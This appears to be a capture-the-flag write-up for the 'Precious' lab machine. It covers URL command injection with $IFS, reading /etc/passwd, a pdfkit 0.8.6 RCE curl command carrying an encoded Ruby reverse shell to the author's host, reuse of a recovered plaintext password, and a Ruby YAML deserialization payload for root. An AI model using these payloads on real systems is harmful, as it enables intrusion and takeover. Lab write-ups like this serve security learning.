# Precious

Nmap reveals two ports: 22 and 80

# Web

I spent quite some time trying to find some kind of injection with both sqlmap and Burp's intruder and various seclists, although I did not find any.

In the end, I watched the initial part of the Ippsec video for this box, and he says he always tries this:

```
http://10.10.16.17/$(whoami)
```

which I did not consider.

But it makes sense! If this is being run on the command line, then the command line will expand the `$()` first, before executing the command itself. So if I ran this locally:

```
http://foo.bar/$(whoami) ==> http://foo.bar/niels (and now it would be passed to curl or whatever).
```

Naive reverse netcat shell did not work.

What about some LFI?

Turns out you can use $IFS instead of spaces, since spaces seems to break everything!

```
http://10.10.16.17:8000/index.html/$(cat$IFS/etc/passwd)
```

Which reveals these users:

```
/root:x:0:0:root:/root:/bin/bash
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
ruby:x:1001:1001::/home/ruby:/bin/bash
```
total%2012%0Adrwxr-xr-x%202%20root%20ruby%204096%20Oct%2026%20%202022%20.%0Adrwxr-xr-x%204%20root%20ruby%204096%20Oct%2026%20%202022%20..%0A-rw-r--r--%201%20root%20ruby%20%20725%20Sep%2024%20%202022%20pdf.rb

# pdfkit

Using this LFI it's possible to see the source code in ./app/controllers/pdf.rb, and the version is 0.8.6.

Google search reveals an RCE exploit for this version!

```
curl 'precious.htb' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'url=http%3A%2F%2F10.10.16.17%3A443%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.16.17%22%2C443%29%29%27%60'
```

# Privesc

Unusual dir called .bundle in /home/ruby/.bundle

henry:Q3c1AqGHtoI0aXAYFH

Let's check if Henry did something silly. Lo and behold - he did!

These are also his ssh credentials.

# More privesc

Looks like we might be able to use the update dependencies script which is based on Ruby and some yaml files.

The update script did not define a specific yaml file. I imagine the idea is that you use the one in the sample dir, but we can also create a new one and use that instead!

Took a bit of trial and error to find a working payload, but in the end, this worked for me:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

And just substituted `id` with `cat /root/root.txt`. I'm sure you can do a reverse shell as well somehow.


